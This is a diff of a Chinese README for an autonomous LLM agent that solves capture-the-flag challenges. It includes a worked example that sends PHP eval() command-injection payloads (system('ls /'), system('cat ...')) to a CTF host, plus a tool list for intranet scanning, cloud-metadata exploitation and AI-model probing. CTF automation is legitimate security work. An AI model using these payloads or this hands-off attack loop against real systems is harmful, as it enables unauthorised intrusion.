@@ -1,324 +1,179 @@
 # CTF-Agent 2.0
 
-基于 **Claude Code Query Loop** 架构的智能CTF自动化求解框架。
+**极简Query循环 × AI完全自主决策**
 
-**对话式交互，AI自主执行** - 像使用Claude Code一样与AI对话，发布任务后AI自动规划时间并执行。
+CTF-Agent 2.0 是一个基于极简Query循环的智能CTF自动化求解框架。核心原则：**框架做得越少越好，AI做得越多越好**。
 
----
+## 特点
 
-## 核心特性
-
-### Claude Code风格交互
-- **对话式界面**: 自然语言描述目标，AI理解并执行
-- **自动时间规划**: AI根据任务复杂度动态分配时间预算
-- **自主决策执行**: 无需人工干预，AI完全自主决策下一步行动
-- **实时状态展示**: 三栏Dashboard显示Timeline/LogStream/DetailPanel
-- **打断与恢复**: 随时打断执行，保持控制权
-
-### 架构特点
-- **Query Loop**: 替代传统状态机，AI完全自主决策
-- **延迟加载**: 工具按需加载，节省Token消耗
-- **Memory系统**: Agent间通信，知识积累
-- **推测执行**: 预先执行可能操作，节省时间
-- **原生工具调用**: 直接调用系统工具，无Docker开销
-
-### 支持的CTF方向
-- **Web安全**: SQL注入、XSS、SSRF、RCE...
-- **PWN**: 栈溢出、堆利用、ROP...
-- **Crypto**: RSA、AES、古典密码...
-- **Reverse**: 逆向工程、反编译...
-- **Misc**: 隐写、取证、流量分析...
-- **内网渗透**: AD域、横向移动...
-- **云安全**: 容器逃逸、云服务利用...
-
----
+- **极简Query循环**：~80行核心代码，框架只做消息传递+超时熔断+循环检测
+- **AI完全自主**：工具选择、错误恢复、策略调整全部由AI决策
+- **高成功率**：明确漏洞场景3-5轮内完成
+- **防循环机制**：自动检测并警告重复调用
 
 ## 快速开始
 
-### 1. 环境要求
+### 安装
 
-**必需**:
-- Python 3.8+
-- Node.js 18+ (前端)
-- Git
-
-**推荐**:
-- Go 1.19+ (安全工具编译)
-- Scoop (Windows包管理)
-
-### 2. 安装
-
-**后端**:
 ```bash
-# 克隆项目
 git clone https://github.com/your-repo/ctf-agent.git
 cd ctf-agent
-
-# 安装Python依赖
 pip install -r requirements.txt
-
-# 配置API密钥
-cp settings.json.example settings.json
-# 编辑settings.json，填入LLM API密钥
 ```
 
-**前端**:
-```bash
-cd frontend
-npm install
-```
+### 配置
 
-**安全工具**:
-```bash
-# Linux
-cd thirdparty
-chmod +x install_all.sh
-./install_all.sh
-
-# Windows (PowerShell)
-cd thirdparty
-Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
-.\install_all.ps1
-```
-
-### 3. 运行
-
-**启动后端服务**:
-```bash
-python -m app.server
-# 或
-uvicorn app.server:app --host 0.0.0.0 --port 8000
-```
-
-**启动前端**:
-```bash
-cd frontend
-npm run dev
-```
-
-**访问**: http://localhost:5173
-
----
-
-## 使用方式
-
-### 对话式交互
-
-在聊天框中输入任务描述，AI会自动理解并执行：
-
-```
-用户: 扫描 http://target.com 并找出SQL注入漏洞
-
-AI: 我将开始扫描目标。根据任务复杂度，预计需要15分钟。
-
-[AI自动执行]
-→ 信息收集: 端口扫描、目录枚举
-→ 漏洞检测: SQL注入测试
-→ 漏洞利用: 数据提取
-→ Flag获取
-
-[TASK_COMPLETE]
-找到Flag: flag{xxx}
-```
-
-### CLI使用
-
-```bash
-# 基本使用
-python -m app.main "扫描 http://target.com"
-
-# 指定类型
-python -m app.main "192.168.1.100" --type network
-
-# 详细输出
-python -m app.main "http://target.com" -v
-```
-
-### 代码调用
-
-```python
-from app.main import run_ctf_agent
-
-result = await run_ctf_agent(
-    target="http://target.com",
-    description="SQL注入测试",
-)
-
-print(f"成功: {result['success']}")
-print(f"Flags: {result['flags']}")
-```
-
----
-
-## 项目结构
-
-```
-CTF-Agent/
-├── app/                        # 后端核心
-│   ├── core/
-│   │   ├── query.py           # Query循环（核心）
-│   │   ├── time_manager.py    # 时间管理
-│   │   └── speculation.py     # 推测执行
-│   ├── tools_v2/              # 工具系统
-│   │   ├── native_executor.py # 原生执行器
-│   │   ├── tool_factory.py    # 工具工厂
-│   │   └── deferred_loader.py # 延迟加载
-│   ├── memory/                # Memory系统
-│   ├── prompts/               # 提示词
-│   └── server.py              # FastAPI服务
-│
-├── frontend/                   # React前端
-│   └── src/
-│       ├── components/        # UI组件
-│       ├── hooks/             # React Hooks
-│       └── store/             # 状态管理
-│
-├── thirdparty/                 # 第三方工具
-│   ├── nmap/                  # 端口扫描
-│   ├── nuclei/                # 漏洞扫描
-│   ├── sqlmap/                # SQL注入
-│   └── ...                    # 更多工具
-│
-├── docs/                       # 文档
-├── skills/                     # Skill定义
-└── settings.json              # 配置文件
-```
-
----
-
-## 架构设计
-
-### Query Loop
-
-核心执行流程，完全遵循Claude Code设计：
-
-```
-用户输入 → System Prompt → LLM决策 → 工具执行 → 结果处理 → 继续或完成
-```
-
-**关键特点**:
-- AI完全自主决策下一步
-- 无硬编码的阶段转换
-- System Prompt指导行为
-- 错误直接返回，AI自我纠错
-
-### 时间管理
-
-AI根据任务复杂度自动规划时间：
-
-```python
-from app.core.time_manager import TimeManager, TaskType
-
-tm = TimeManager()
-budget = tm.create_budget("session-1", TaskType.CTF_SINGLE_FLAG)
-# 默认30分钟，AI可在范围内自由分配
-```
-
-### 工具调用机制
-
-原生执行，无Docker开销：
-
-```python
-from app.tools_v2.native_executor import get_native_executor
-
-executor = get_native_executor()
-result = await executor.execute(
-    tool_name="nmap",
-    args=["-sV", "192.168.1.1"],
-    timeout=120000
-)
-```
-
----
-
-## 配置
-
-### settings.json
+创建 `settings.json`：
 
 ```json
 {
   "model": {
-    "name": "glm-5",
-    "base_url": "https://open.bigmodel.cn/api/paas/v4/",
-    "api_key": "${LLM_API_KEY}"
+    "name": "qwen3.5-plus",
+    "base_url": "https://coding.dashscope.aliyuncs.com/v1/",
+    "api_key": "${DASHSCOPE_API_KEY}"
   },
   "timeouts": {
-    "ctf_single": 1800,
-    "ctf_multi": 3600
-  },
-  "tools": {
-    "native_execution": true
+    "ctf_single": 1800
   }
 }
 ```
 
-### 环境变量
+### 运行
 
 ```bash
-# Linux/macOS
-export LLM_API_KEY="your-api-key"
-
-# Windows
-set LLM_API_KEY=your-api-key
+python -m app.main "http://target.com"
 ```
 
----
+## 架构
+
+```
+┌──────────────────────────────────────────────────────┐
+│                  System Prompt                        │
+│  (身份 + 规则 + Few-Shot，<1500字，无强制标记检查)     │
+└──────────────────────┬───────────────────────────────┘
+                       │
+┌──────────────────────▼───────────────────────────────┐
+│                   Query Loop                          │
+│                                                       │
+│   while not done:                                     │
+│       response = llm.chat(messages, tools)            │
+│       if has_tool_calls(response):                    │
+│           results = execute_tools(response.tool_calls)│
+│           messages.append(results)                    │
+│       else:                                           │
+│           done = True                                 │
+│                                                       │
+│   框架仅干预2件事：                                    │
+│     1. 超时熔断（注入[TIMEOUT]消息）                   │
+│     2. 循环检测（注入[LOOP_DETECTED]消息）             │
+└──────────────────────────────────────────────────────┘
+```
 
 ## 工具列表
 
-### 核心工具（P0）
-
-| 工具 | 用途 | 安装 |
+| 类别 | 工具 | 说明 |
 |------|------|------|
-| nmap | 端口扫描 | apt/scoop |
-| nuclei | 漏洞扫描 | go install |
-| httpx | HTTP探测 | go install |
-| sqlmap | SQL注入 | pip install |
-| ffuf | 模糊测试 | go install |
+| 核心工具 | http_request, bash | 90%的Web测试用http_request完成 |
+| 知识工具 | load_skill, list_skills | 加载领域知识包 |
+| 记忆工具 | remember, recall | 记录/回忆发现 |
+| Web漏洞 | sqlmap, ffuf | 确认漏洞后使用 |
+| 信息收集 | nmap, nuclei | 未知目标时使用 |
+| 内网渗透 | fscan | 内网综合扫描 |
+| 云安全 | cloud_storage_check, cloud_metadata | 云环境利用 |
+| AI安全 | ai_probe | AI模型探测 |
 
-### 完整工具列表
+## 示例
 
-见 [thirdparty/README.md](thirdparty/README.md)
+### PHP代码注入
 
----
+**目标**：`http://node5.anna.nssctf.cn:21013/`
+
+**代码**：
+```php
+<?php
+if(isset($_GET['url'])) {
+    eval($_GET['url']);
+}
+?>
+```
+
+**执行过程**：
+```
+[Turn 1] AI: "I'll start by fetching the target URL..."
+         Tool: http_request(url="http://...")
+         Result: PHP代码
+
+[Turn 2] AI: "I see a code injection vulnerability..."
+         Tool: http_request(url="...?url=system('ls /')")
+         Result: 文件列表
+
+[Turn 3] AI: "Found a suspicious file..."
+         Tool: http_request(url="...?url=system('cat /flllllaaaaaaggggggg')")
+         Result: NSSCTF{...}
+
+[Turn 4] AI: "Found the FLAG! NSSCTF{...}"
+         Complete
+```
+
+**轮数**：4轮
 
 ## 文档
 
-- [Windows安装指南](docs/INSTALL_WINDOWS.md)
-- [Linux配置指南](docs/INSTALL_LINUX.md)
-- [架构设计](docs/ARCHITECTURE.md)
-- [API文档](docs/API.md)
+- [架构文档](docs/ARCHITECTURE.md)
+- [API参考](docs/API_REFERENCE.md)
+- [工作流文档](docs/WORKFLOW.md)
+- [函数参考](docs/FUNCTIONS.md)
+- [模块详解](docs/MODULES.md)
+- [项目结构](docs/PROJECT_STRUCTURE.md)
 
----
+## 核心设计
 
-## 开发
+### 为什么极简？
 
-### 运行测试
+**传统框架问题**：
+- Skill注入：框架假设AI不知道何时加载Skill
+- Self-Check Gates：框架不信任AI输出
+- Meta-Cognition：框架强制AI报告状态
+- 这些都是"框架做得太多，AI做得太少"
 
-```bash
-pytest tests/ -v
-```
+**极简方案**：
+- Skill是工具，AI自己调用`load_skill`
+- Memory是工具，AI自己调用`remember`/`recall`
+- 提示词引导，不代码强制
+- AI完全自主决策
 
-### 代码检查
+### 为什么只有超时和循环检测？
 
-```bash
-semgrep --config=auto app/
-```
+**数学确定性**：
+- **超时**：时间不可逆
+- **循环检测**：相同输入=相同输出
+- **其他**：都有不确定性，应该由AI判断
 
-### 添加新工具
+## 性能指标
 
-1. 在 `thirdparty/` 创建工具目录
-2. 添加安装脚本 `install.sh` 和 `install.ps1`
-3. 在 `app/tools_v2/ctf_tools.py` 注册工具Schema
+| 指标 | 值 |
+|------|---|
+| Query循环代码行数 | ~80行 |
+| 工具数量 | ~25个 |
+| 提示词长度 | ~1200字 |
+| 典型CTF完成轮数 | 3-5轮 |
+| 最大轮数限制 | 200轮 |
+| 默认超时 | 30分钟 |
 
----
+## 对比Claude Code
+
+| 特性 | Claude Code | CTF-Agent 2.0 |
+|------|-------------|---------------|
+| Query循环 | 极简管道 | 极简管道（完全一致） |
+| 工具系统 | buildTool工厂 | buildTool工厂（完全一致） |
+| 状态管理 | External Store | 简化为AgentState |
+| 提示词 | 自主决策 | 自主决策（完全一致） |
+| 框架干预 | 超时+循环检测 | 超时+循环检测（完全一致） |
 
 ## 许可证
 
-MIT License
-
----
+MIT
 
 ## 贡献
 
-欢迎提交 Issue 和 Pull Request！
+欢迎提交Issue和Pull Request！
